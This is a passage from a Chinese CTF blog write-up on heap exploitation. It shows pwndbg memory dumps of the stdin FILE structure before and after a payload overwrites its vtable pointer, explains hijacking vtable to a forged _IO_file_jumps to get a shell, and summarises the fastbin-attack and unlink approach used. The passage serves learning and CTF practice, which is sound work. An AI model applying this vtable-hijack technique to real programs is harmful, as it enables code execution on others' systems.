<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x7f75433786e0</span> (_IO_file_jumps) ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>payload覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f754337997d</span>+<span class="number">3</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f7543379980</span> (_IO_2_1_stdin_+<span class="number">160</span>) —▸ <span class="number">0x7f75433799c0</span> (_IO_wide_data_0) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f7543379988</span> (_IO_2_1_stdin_+<span class="number">168</span>) ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f75433799a0</span> (_IO_2_1_stdin_+<span class="number">192</span>) ◂— <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f75433799a8</span> (_IO_2_1_stdin_+<span class="number">200</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f75433799b0</span> (_IO_2_1_stdin_+<span class="number">208</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f75433799b8</span> (_IO_2_1_stdin_+<span class="number">216</span>) —▸ <span class="number">0x562989a57010</span> ◂— <span class="number">0x0</span> <span class="comment">// 临时修改</span></span><br></pre></td></tr></table></figure>
<p><code>vtable</code> 变量的值为 <code>_IO_file_jumps</code> 的指针，<code>_IO_file_jumps</code> 中保存了一些函数指针，一系列标准IO函数中会调用这些函数指针，但 <code>_IO_file_jumps</code> 里的内容是无法修改的，但可以修改 <code>vtable</code> 指向伪造的 <code>_IO_file_jumps</code> 从而getshell </p>
<hr>
<p><strong>小结：</strong></p>
<p>这个题目我先自己做了做，成功 leak 了 heap_addr 和 libc_base，想到了打 fastbin attack，利用 unlink 实现 overlapping 来突破本程序严格的 size 检查，但是最后卡 unlink 那里了，复盘时发现自己的堆排布很乱，导致 unlink 总是出现未知状况（触发莫名其妙的合并等等）</p>
<p>学习大佬的 exp 时也踩了大坑，用 LibcSearcher 查找出来的 libc 版本有误，凑巧的是，在线查询网站上也是这个结果，导致我的 <code>_IO_2_1_stdin_</code> 排列的和其他师傅的博客大相径庭，最后，我在一篇博客中看到：在IDA中可以直接查看 libc.so.6 的 libc 版本</p>
<p><img src="/2022/03/11/Unlink%E6%94%BB%E5%87%BB+fastbin%20attack+vtable%E5%8A%AB%E6%8C%81/1647013341453-1647447265254.png" alt="1647013341453-1647447265254"> </p>
<p>这些坑现在踩了，以后就注意了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><a class="extend next" rel="next" href="/page/28/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">314</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">162</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.7m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">70:57</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
